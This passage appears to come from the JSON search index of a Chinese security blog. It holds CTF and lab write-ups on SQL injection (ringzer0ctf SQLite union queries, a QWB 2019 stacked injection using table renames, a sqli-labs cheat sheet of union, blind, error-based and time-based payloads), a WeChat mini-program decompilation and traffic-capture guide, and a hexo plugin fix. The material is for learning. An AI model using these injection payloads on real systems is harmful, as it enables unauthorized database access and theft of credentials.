class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">GET &#x2F;challenges&#x2F;40&#x2F;?id&#x3D;2) union select sql,2,3 from sqlite_master where type&#x3D;&#39;table&#39; and name&#x3D;&#39;flag&#39;-- HTTP&#x2F;1.1</span><br><span class=\"line\">Host: ringzer0ctf.com</span><br><span class=\"line\">Connection: close</span><br><span class=\"line\">Pragma: no-cache</span><br><span class=\"line\">Cache-Control: no-cache</span><br><span class=\"line\">Upgrade-Insecure-Requests: 1</span><br><span class=\"line\">User-Agent: Mozilla&#x2F;5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;86.0.4240.111 Safari&#x2F;537.36</span><br><span class=\"line\">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9</span><br><span class=\"line\">Sec-Fetch-Site: none</span><br><span class=\"line\">Sec-Fetch-Mode: navigate</span><br><span class=\"line\">Sec-Fetch-User: ?1</span><br><span class=\"line\">Sec-Fetch-Dest: document</span><br><span class=\"line\">Accept-Encoding: gzip, deflate</span><br><span class=\"line\">Accept-Language: zh-CN,zh;q&#x3D;0.9</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/2020/11/10/sqlite%E6%B3%A8%E5%85%A5/image-20201110151358910.png\" alt=\"image-20201110151358910\"></p>\n<p>最后即可查询出来flag</p>\n<figure class=\"highlight http\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">GET</span> <span class=\"string\">/challenges/40/?id=2)</span> union <span class=\"string\">select</span> content,2,3 <span class=\"string\">from</span> flag <span class=\"string\">limit</span> 0,1-- <span class=\"string\">HTTP/1.1</span></span><br><span class=\"line\"><span class=\"string\">Host:</span> ringzer0ctf.com</span><br><span class=\"line\"><span class=\"attribute\">Connection</span>: close</span><br><span class=\"line\"><span class=\"attribute\">Pragma</span>: no-cache</span><br><span class=\"line\"><span class=\"attribute\">Cache-Control</span>: no-cache</span><br><span class=\"line\"><span class=\"attribute\">Upgrade-Insecure-Requests</span>: 1</span><br><span class=\"line\"><span class=\"attribute\">User-Agent</span>: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36</span><br><span class=\"line\"><span class=\"attribute\">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class=\"line\"><span class=\"attribute\">Sec-Fetch-Site</span>: none</span><br><span class=\"line\"><span class=\"attribute\">Sec-Fetch-Mode</span>: navigate</span><br><span class=\"line\"><span class=\"attribute\">Sec-Fetch-User</span>: ?1</span><br><span class=\"line\"><span class=\"attribute\">Sec-Fetch-Dest</span>: document</span><br><span class=\"line\"><span class=\"attribute\">Accept-Encoding</span>: gzip, deflate</span><br><span class=\"line\"><span class=\"attribute\">Accept-Language</span>: zh-CN,zh;q=0.9</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/2020/11/10/sqlite%E6%B3%A8%E5%85%A5/image-20201110151430788.png\" alt=\"image-20201110151430788\"></p>\n","categories":["Pentest"],"tags":["SQL注入"]},{"title":"微信小程序安全测试","url":"http://blog.le31ei.top/2020/11/09/微信小程序安全测试/","content":"<p>仅记录实战操作的过程，对小程序原理需要了解的，参考附件文档。</p>\n<h1 id=\"0x01-反编译\"><a href=\"#0x01-反编译\" class=\"headerlink\" title=\"0x01 反编译\"></a>0x01 反编译</h1><p><strong>导出小程序wxapkg包</strong></p>\n<p><code>adb pull /data/data/com.tencent.mm/MicroMsg/&#123;微信ID&#125;/appbrand/pkg/_-14931312_34.wxapkg ./</code></p>\n<p>需要先<code>adb root</code></p>\n<p><strong>反编译小程序包</strong></p>\n<p><code>node wuWxapkg.js _-1496931312_34.wxapkg</code></p>\n<p><img src=\"/2020/11/09/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95/image-20201109153208111.png\" alt=\"image-20201109153208111\"></p>\n<h1 id=\"0x02-抓包\"><a href=\"#0x02-抓包\" class=\"headerlink\" title=\"0x02 抓包\"></a>0x02 抓包</h1><p>安卓7.0之后，必须导入为系统证书后，才能进行抓包，但burp证书在导入后，仍然无法进行抓包，那么就需要用到<code>charles</code>工具进行抓包。</p>\n<p><strong>导出证书</strong></p>\n<p>通过<code>help-&gt;SSL Proxying-&gt;save Charles root certifacate</code>导出证书，导出后导入安卓作为系统证书，即可进行抓包。</p>\n<p><img src=\"/2020/11/09/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95/image-20201109150342123.png\" alt=\"image-20201109150342123\"></p>\n<p><strong>重放数据包</strong></p>\n<p>对数据包右键打了断点后，点击breakpoint按钮打开拦截，然后点击右键repeat进行重放，即可进行抓包</p>\n<p><img src=\"/2020/11/09/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95/image-20201109152611419.png\" alt=\"image-20201109152611419\"></p>\n<p><img src=\"/2020/11/09/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95/image-20201109152502367.png\" alt=\"image-20201109152502367\"></p>\n<p><img src=\"/2020/11/09/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95/image-20201109152842638.png\" alt=\"image-20201109152842638\"></p>\n<h1 id=\"参考文档\"><a href=\"#参考文档\" class=\"headerlink\" title=\"参考文档\"></a>参考文档</h1><ol>\n<li><a href=\"./wxappUnpacker.zip\">wxappUnpacker</a></li>\n<li><a href=\"./%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E7%9A%84%E6%B8%97%E9%80%8F%E4%BA%94%E8%84%89.pdf\">微信小程序的渗透五脉 - Hack Inn</a></li>\n<li><a href=\"./%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E6%96%87%E4%BB%B6%E5%88%86%E6%9E%90.pptx\">微信小程序文件分析</a></li>\n<li><a href=\"./%E7%99%BE%E4%B8%BE%E7%99%BE%E6%8D%B7%EF%BC%9A%E7%BA%A2%E9%98%9F%E8%A7%86%E8%A7%92%E4%B8%8B%E5%8F%88%E4%B8%80%E4%B8%AA%E7%AA%81%E7%A0%B4%E5%8F%A3%EF%BC%8C%E5%86%8D%E7%9C%8B%E5%A4%A7%E5%9B%BD%E7%8B%AC%E6%9C%89%E5%B0%8F%E7%A8%8B%E5%BA%8F.pdf\">百举百捷：红队视角下又一个突破口，再看大国独有小程序</a></li>\n</ol>\n","categories":["Pentest"],"tags":["微信小程序"]},{"title":"hexo-asset-image插件图片地址显示错误","url":"http://blog.le31ei.top/2020/11/03/hexo-asset-image插件图片地址显示错误/","content":"<p><code>hexo-asset-image</code>插件存在bug，导致hexo生成的图片链接不能正确生成。</p>\n<p><strong>解决方法</strong>:</p>\n<p>将文件<code>node_modules/hexo-asset-image/index.js</code>替换为如下内容:</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&#x27;use strict&#x27;</span>;</span><br><span class=\"line\"><span class=\"keyword\">var</span> cheerio = <span class=\"built_in\">require</span>(<span class=\"string\">&#x27;cheerio&#x27;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// http://stackoverflow.com/questions/14480345/how-to-get-the-nth-occurrence-in-a-string</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">getPosition</span>(<span class=\"params\">str, m, i</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> str.split(m, i).join(m).length;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">var</span> version = <span class=\"built_in\">String</span>(hexo.version).split(<span class=\"string\">&#x27;.&#x27;</span>);</span><br><span class=\"line\">hexo.extend.filter.register(<span class=\"string\">&#x27;after_post_render&#x27;</span>, <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">data</span>)</span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">var</span> config = hexo.config;</span><br><span class=\"line\">  <span class=\"function\"><span class=\"title\">if</span>(<span class=\"params\">config.post_asset_folder</span>)</span>&#123;</span><br><span class=\"line\">      <span class=\"keyword\">var</span> link = data.permalink;</span><br><span class=\"line\">  <span class=\"keyword\">if</span>(version.length &gt; <span class=\"number\">0</span> &amp;&amp; <span class=\"built_in\">Number</span>(version[<span class=\"number\">0</span>]) == <span class=\"number\">3</span>)</span><br><span class=\"line\">     <span class=\"keyword\">var</span> beginPos = getPosition(link, <span class=\"string\">&#x27;/&#x27;</span>, <span class=\"number\">1</span>) + <span class=\"number\">1</span>;</span><br><span class=\"line\">  <span class=\"keyword\">else</span></span><br><span class=\"line\">     <span class=\"keyword\">var</span> beginPos = getPosition(link, <span class=\"string\">&#x27;/&#x27;</span>, <span class=\"number\">3</span>) + <span class=\"number\">1</span>;</span><br><span class=\"line\">  <span class=\"comment\">// In hexo 3.1.1, the permalink of &quot;about&quot; page is like &quot;.../about/index.html&quot;.</span></span><br><span class=\"line\">  <span class=\"keyword\">var</span> endPos = link.lastIndexOf(<span class=\"string\">&#x27;/&#x27;</span>) + <span class=\"number\">1</span>;</span><br><span class=\"line\">    link = link.substring(beginPos, endPos);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">var</span> toprocess = [<span class=\"string\">&#x27;excerpt&#x27;</span>, <span class=\"string\">&#x27;more&#x27;</span>, <span class=\"string\">&#x27;content&#x27;</span>];</span><br><span class=\"line\">    <span class=\"function\"><span class=\"title\">for</span>(<span class=\"params\"><span class=\"keyword\">var</span> i = <span class=\"number\">0</span>; i &lt; toprocess.length; i++</span>)</span>&#123;</span><br><span class=\"line\">      <span class=\"keyword\">var</span> key = toprocess[i];</span><br><span class=\"line\"> </span><br><span class=\"line\">      <span class=\"keyword\">var</span> $ = cheerio.load(data[key], &#123;</span><br><span class=\"line\">        ignoreWhitespace: <span class=\"literal\">false</span>,</span><br><span class=\"line\">        xmlMode: <span class=\"literal\">false</span>,</span><br><span class=\"line\">        lowerCaseTags: <span class=\"literal\">false</span>,</span><br><span class=\"line\">        decodeEntities: <span class=\"literal\">false</span></span><br><span class=\"line\">      &#125;);</span><br><span class=\"line\"></span><br><span class=\"line\">      $(<span class=\"string\">&#x27;img&#x27;</span>).each(<span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ($(<span class=\"built_in\">this</span>).attr(<span class=\"string\">&#x27;src&#x27;</span>))&#123;</span><br><span class=\"line\">      <span class=\"comment\">// For windows style path, we replace &#x27;\\&#x27; to &#x27;/&#x27;.</span></span><br><span class=\"line\">      <span class=\"keyword\">var</span> src = $(<span class=\"built_in\">this</span>).attr(<span class=\"string\">&#x27;src&#x27;</span>).replace(<span class=\"string\">&#x27;\\\\&#x27;</span>, <span class=\"string\">&#x27;/&#x27;</span>);</span><br><span class=\"line\">      <span class=\"keyword\">if</span>(!<span class=\"regexp\">/http[s]*.*|\\/\\/.*/</span>.test(src) &amp;&amp;</span><br><span class=\"line\">         !<span class=\"regexp\">/^\\s*\\//</span>.test(src)) &#123;</span><br><span class=\"line\">        <span class=\"comment\">// For &quot;about&quot; page, the first part of &quot;src&quot; can&#x27;t be removed.</span></span><br><span class=\"line\">        <span class=\"comment\">// In addition, to support multi-level local directory.</span></span><br><span class=\"line\">        <span class=\"keyword\">var</span> linkArray = link.split(<span class=\"string\">&#x27;/&#x27;</span>).filter(<span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">elem</span>)</span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> elem != <span class=\"string\">&#x27;&#x27;</span>;</span><br><span class=\"line\">        &#125;);</span><br><span class=\"line\">        <span class=\"keyword\">var</span> srcArray = src.split(<span class=\"string\">&#x27;/&#x27;</span>).filter(<span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">elem</span>)</span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> elem != <span class=\"string\">&#x27;&#x27;</span> &amp;&amp; elem != <span class=\"string\">&#x27;.&#x27;</span>;</span><br><span class=\"line\">        &#125;);</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(srcArray.length &gt; <span class=\"number\">1</span>)</span><br><span class=\"line\">        srcArray.shift();</span><br><span class=\"line\">        src = srcArray.join(<span class=\"string\">&#x27;/&#x27;</span>);</span><br><span class=\"line\">        $(<span class=\"built_in\">this</span>).attr(<span class=\"string\">&#x27;src&#x27;</span>, config.root + link + src);</span><br><span class=\"line\">        <span class=\"built_in\">console</span>.info&amp;&amp;<span class=\"built_in\">console</span>.info(<span class=\"string\">&quot;update link as:--&gt;&quot;</span>+config.root + link + src);</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">    &#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">      <span class=\"built_in\">console</span>.info&amp;&amp;<span class=\"built_in\">console</span>.info(<span class=\"string\">&quot;no src attr, skipped...&quot;</span>);</span><br><span class=\"line\">      <span class=\"built_in\">console</span>.info&amp;&amp;<span class=\"built_in\">console</span>.info($(<span class=\"built_in\">this</span>));</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">      &#125;);</span><br><span class=\"line\">      data[key] = $.html();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;);</span><br></pre></td></tr></table></figure>\n\n\n\n","categories":["bug"],"tags":["hexo-asset-image,hexo"]},{"title":"堆叠注入","url":"http://blog.le31ei.top/2020/11/02/堆叠注入/","content":"<h1 id=\"0x01-原理\"><a href=\"#0x01-原理\" class=\"headerlink\" title=\"0x01 原理\"></a>0x01 原理</h1><p>通过分号(<code>;</code>)连接多条SQL语句进行注入。union连接的联合查询能执行的语句时有限的，需要考虑到where子句之前的情况，而堆叠注入可执行任意mysql语句，比如<code>use database</code>等。在php代码中，采用<code>mysqli_multi_query</code>进行查询时，会造成堆叠注入，而如果采用<code>mysql_query</code>会显示语句错误不能进行堆叠注入。</p>\n<p><strong>局限性</strong>：</p>\n<p>代码一般只返回第一个查询结果，堆叠注入产生的结果或者错误只能被忽略，这就需要采用一些延时注入，或者alter类型的操作来修改数据达到查询结果的目的。</p>\n<h1 id=\"0x02-强网杯2019-easy-sql\"><a href=\"#0x02-强网杯2019-easy-sql\" class=\"headerlink\" title=\"0x02 强网杯2019 easy_sql\"></a>0x02 强网杯2019 easy_sql</h1><p><img src=\"/2020/11/02/%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/image-20201103154443289.png\" alt=\"image-20201103154443289\"></p>\n<p>题目过滤了如下函数:</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">return</span> preg_match(<span class=\"string\">&quot;/select|update|delete|drop|insert|where|\\./i&quot;</span>,$inject);</span><br></pre></td></tr></table></figure>\n\n<p>基本的注入方式都过滤了，可以采用报错注入进行尝试，但无法跨表查询，过滤了<code>.</code>。</p>\n<p><img src=\"/2020/11/02/%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/image-20201103203004084.png\" alt=\"image-20201103203004084\"></p>\n<p>尝试堆叠注入<code>show databases</code>：</p>\n<p><img src=\"/2020/11/02/%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/image-20201103203351170.png\" alt=\"image-20201103203351170\"></p>\n<p>查看表名<code>show tables from supersqli</code></p>\n<p><img src=\"/2020/11/02/%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/image-20201103203447755.png\" alt=\"image-20201103203447755\"></p>\n<p>查看列名<code>show columns from `1919810931114514` </code>，表名是纯数字，需要添加反引号识别为字符串</p>\n<p><img src=\"/2020/11/02/%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/image-20201103203757420.png\" alt=\"image-20201103203757420\"></p>\n<p>查看到了存放flag的表，但无法通过语句查询出来结果，堆叠注入只能是前面的select语句回显结果。</p>\n<p>最后需要通过<code>alter</code>和<code>rename</code>直接修改<code>1919810931114514</code>表名，然后进行查询</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">rename</span> <span class=\"keyword\">tables</span> <span class=\"string\">`words`</span> <span class=\"keyword\">to</span> <span class=\"string\">`words1`</span>;<span class=\"keyword\">rename</span> <span class=\"keyword\">tables</span> <span class=\"string\">`1919810931114514`</span> <span class=\"keyword\">to</span> <span class=\"string\">`words`</span>; <span class=\"keyword\">alter</span> <span class=\"keyword\">table</span> <span class=\"string\">`words`</span> <span class=\"keyword\">change</span> <span class=\"string\">`flag`</span> <span class=\"string\">`id`</span> <span class=\"built_in\">varchar</span>(<span class=\"number\">100</span>);<span class=\"comment\">#</span></span><br></pre></td></tr></table></figure>\n\n\n\n<p><img src=\"/2020/11/02/%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/image-20201103204324144.png\" alt=\"image-20201103204324144\"></p>\n<p>查询flag</p>\n<p><img src=\"/2020/11/02/%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/image-20201103204407576.png\" alt=\"image-20201103204407576\"></p>\n","categories":["Pentest"],"tags":["SQL注入"]},{"title":"sqli-labs学习笔记","url":"http://blog.le31ei.top/2020/11/02/sqli-labs学习笔记/","content":"<h2 id=\"less-1-less4-基础注入\"><a href=\"#less-1-less4-基础注入\" class=\"headerlink\" title=\"less-1 ~ less4 基础注入\"></a>less-1 ~ less4 基础注入</h2><p>基础的注入，直接回显数据库查询内容，可用常规思路进行注入</p>\n<p>用到的注入语句如下：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> 查询列数</span></span><br><span class=\"line\">http://192.168.100.51/sql/Less-1/?id=1%27+order+by+3--+</span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> 回显查询列对应的位置,union查询需要前半部分查出来为NULL才会显示后半段内容，所以id要为-1</span></span><br><span class=\"line\">http://192.168.100.51/sql/Less-1/?id=-1%27+union+select+1,2,3--+</span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> 查库</span></span><br><span class=\"line\">http://192.168.100.51/sql/Less-1/?id=-1%27+union+select+1,group_concat(schema_name),3+from+information_schema.schemata--+</span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> 查表</span></span><br><span class=\"line\">http://192.168.100.51/sql/Less-1/?id=-1%27+union+select+1,group_concat(table_name),3+from+information_schema.tables+where+table_schema=%27security%27--+</span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> 查列</span></span><br><span class=\"line\">http://192.168.100.51/sql/Less-1/?id=-1%27+union+select+1,group_concat(column_name),3+from+information_schema.columns+where+table_name=%27users%27--+</span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> 查数据</span></span><br><span class=\"line\">http://192.168.100.51/sql/Less-1/?id=-1%27+union+select+1,group_concat(username,password),3+from+users+where+id=1--+</span><br><span class=\"line\"> </span><br></pre></td></tr></table></figure>\n\n<p>Less1 字符型注入</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http:&#x2F;&#x2F;192.168.100.51&#x2F;sql&#x2F;Less-1&#x2F;?id&#x3D;-1%27+union+select+1,group_concat(username,password),3+from+users+where+id&#x3D;1--+</span><br></pre></td></tr></table></figure>\n\n<p>less2 数字型注入</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http:&#x2F;&#x2F;192.168.100.51&#x2F;sql&#x2F;Less-2&#x2F;?id&#x3D;-1+union+select+1,group_concat(username,password),3+from+users+where+id&#x3D;1--+</span><br></pre></td></tr></table></figure>\n\n<p>Less3</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http:&#x2F;&#x2F;192.168.100.51&#x2F;sql&#x2F;Less-3&#x2F;?id&#x3D;-1%27)+union+select+1,group_concat(username,password),3+from+users+where+id&#x3D;1--+</span><br></pre></td></tr></table></figure>\n\n<p>less4</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http:&#x2F;&#x2F;192.168.100.51&#x2F;sql&#x2F;Less-4&#x2F;?id&#x3D;1%22)+and+1&#x3D;2+union+select+1,group_concat(username,password),3+from+users+where+id&#x3D;1--+</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"less5-less6-盲注\"><a href=\"#less5-less6-盲注\" class=\"headerlink\" title=\"less5~less6 盲注\"></a>less5~less6 盲注</h2><p>盲注常用到的函数：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> left(a,b)函数，取a的前b位</span></span><br><span class=\"line\">left(user(),1)</span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> substr从b位置开始，取a的前c位</span></span><br><span class=\"line\">substr(a,b,c)</span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> ascii将字符转换为ascii码的形式</span></span><br><span class=\"line\">ascii(&#x27;a&#x27;)</span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> mid函数从b位置开始截取a字符的c位，与substr作用相同</span></span><br><span class=\"line\">mid(a,b,c)</span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> ord函数同ascii函数一样，将字符转换为ascii码值</span></span><br><span class=\"line\">ord(&#x27;a&#x27;)</span><br><span class=\"line\"> </span><br><span class=\"line\">ascii(substr(select user(),1,1))=98</span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> <span class=\"keyword\">if</span>判断语句：<span class=\"keyword\">if</span>(a,b,c)，如果a为真，返回b，否则返回c</span></span><br><span class=\"line\">if((user() regexp &#x27;^ro&#x27;), 0, 1)</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"regexp正则注入\"><a href=\"#regexp正则注入\" class=\"headerlink\" title=\"regexp正则注入\"></a>regexp正则注入</h3><p>用法：</p>\n<p>匹配到结果返回true，否则返回false</p>\n<p><code>select user() regexp &#39;^ro&#39;</code>：匹配查询结果是root，结果正确的时候为真，否则为假</p>\n<p>注入语句：<code>select * from users where id=1 and 1=(user() regexp &#39;^ro&#39;)</code></p>\n<h3 id=\"like匹配注入\"><a href=\"#like匹配注入\" class=\"headerlink\" title=\"like匹配注入\"></a>like匹配注入</h3><p>用法：</p>\n<p>查询到结果返回true，否则返回false</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">select user() like &#39;ro%&#39;</span><br></pre></td></tr></table></figure>\n\n<p>注入语句：<br><code>select * from usres where id =1 and 1=(user() like &#39;ro%&#39;)</code></p>\n<h3 id=\"报错注入\"><a href=\"#报错注入\" class=\"headerlink\" title=\"报错注入\"></a>报错注入</h3><figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> floor报错</span></span><br><span class=\"line\">Select 1,count(*),concat(0x3a,0x3a,(select user()),0 x3a,0x3a,floor(rand(0)*2))a from information_schema.columns group by a--+</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> xpath注入</span></span><br><span class=\"line\">extractvalue(1,concat(0x7e,(select%20user()),0x7e))%20--+</span><br><span class=\"line\">updatexml(1,concat(0x7e,(select%20@@version),0x7e),1)%20--+</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\">  bigint 溢出</span></span><br><span class=\"line\">union select (!(select * from (select user())x) - ~0),2,3- -+</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\">  double 数值类型超出范围</span></span><br><span class=\"line\">union select (exp(~(select * FROM(SELECT USER())))),2, 3--+</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> 数据重复性</span></span><br><span class=\"line\"><span class=\"meta\">union%</span><span class=\"bash\">20select%201,2,3%20from%20(select%20NAME_CONST(version(),1),%20NAME_CONST(version(),1))x%20--+</span></span><br><span class=\"line\"> </span><br><span class=\"line\"> </span><br></pre></td></tr></table></figure>\n\n<h3 id=\"延时注入\"><a href=\"#延时注入\" class=\"headerlink\" title=\"延时注入\"></a>延时注入</h3><figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span 